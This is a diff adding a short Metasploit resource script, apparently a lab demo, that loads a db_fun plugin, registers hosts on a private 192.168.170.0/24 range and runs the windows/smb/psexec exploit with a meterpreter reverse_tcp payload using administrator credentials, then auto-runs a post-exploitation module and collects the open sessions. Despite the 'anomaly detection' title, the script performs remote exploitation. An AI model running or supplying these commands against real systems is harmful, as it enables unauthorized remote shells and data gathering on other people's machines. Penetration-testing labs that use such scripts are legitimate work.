@@ -1,0 +1,33 @@
+# demo host anomaly detection
+
+# change dir to where our scripts tend to be
+cd /msf/scripts/resource
+
+# clear the screen (just eye candy)
+resource clear
+
+# load db_fun
+load db_fun
+#db_fun_debug true
+
+# delete all hosts from db
+hosts -d *
+db_search hosts
+
+# delay
+resource rc_delay_fancy
+
+resource clear
+
+# add all my hosts
+hosts -a 192.168.170.1/24
+db_search hosts where address~192.168.170.12
+db_set_create some_hosts
+#db_set_run_module some_hosts scanner/smb/smb_version
+
+resource rc_delay_fancy
+
+db_set_run_module windows windows/smb/psexec windows/meterpreter/reverse_tcp SMBUser=administrator SMBPass=lab AutoRunScript=post/windows/gather/enum_applications
+db_search sessions where closed_at=nil
+db_set_create active_sessions
+
